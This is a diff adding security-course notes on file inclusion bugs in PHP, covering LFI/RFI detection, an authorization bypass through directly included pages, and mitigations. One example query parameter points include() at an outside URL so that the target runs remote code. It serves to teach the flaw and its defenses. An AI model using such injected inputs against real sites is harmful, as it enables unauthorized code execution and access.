@@ -468,3 +468,32 @@ Getting rid of visible Session ID, but if your app/server still allows them, it'
 When a user logs in, they get a brand new session with a brand new ID. No matter if they just got a session for visiting the site 30seconds ago. This cuts session fixation by not allowing a single session ID to persist across logins, and reinforces the proper session == authentication paradigm
 
 ## [File Inclusion Bugs](https://www.youtube.com/watch?v=tkSmaMlSQ9E&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=7)
+
+### Example
+
+You're testing a website and you see the following URL:
+
+`http://example.com/index.php?page=home`
+
+If you change the query to `?page=test`, it gives you the following error:
+
+`Warning: include(test.php): failed to open stream: No such file or directory in - on line 26`
+
+It seems to include() page you reference in the query, and appending '.php' to it.
+
+What if we change it to `?page=http://demoseen.com/test`?
+Suddenly, it's making a web request -- any code that's contained in that file is going to be executed by the website.
+In many cases, PHP (and other languages/frameworks) will be configured to not allow web requests from an include(). When they're possible, you have RFI -- when they're not, LFI.
+
+### Authorization Bypass
+
+Often applications are written such that authorization checks happen in a different file than the actual logic.
+So in our scenario, going to `?page=admin` might give you a login prompt, but `?page=admin_users` might give you direct access to the user management component.
+
+### Mitigation
+
+No user input should be used in include().
+
+Otherwise: whitelisting as strictly as possible without restricting fonctionality.
+
+If neither is viable, then removing directory separators may be the only route. This is _not_ recommended, but will prevent URLs and directory traversal.
